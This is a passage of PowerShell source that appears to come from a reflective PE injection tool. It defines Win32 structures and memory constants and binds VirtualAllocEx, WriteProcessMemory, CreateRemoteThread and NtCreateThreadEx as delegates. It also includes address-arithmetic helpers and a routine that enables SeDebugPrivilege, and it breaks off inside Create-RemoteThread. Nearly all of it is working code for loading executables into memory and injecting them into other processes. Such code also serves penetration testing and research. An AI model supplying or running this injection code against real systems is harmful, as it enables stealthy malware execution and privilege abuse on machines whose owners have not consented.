        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
        [IntPtr]
        $EndAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr]::Zero
        if ($PsCmdlet.ParameterSetName -eq "Size")
        {
            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        }
        else
        {
            $FinalEndAddress = $EndAddress
        }
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
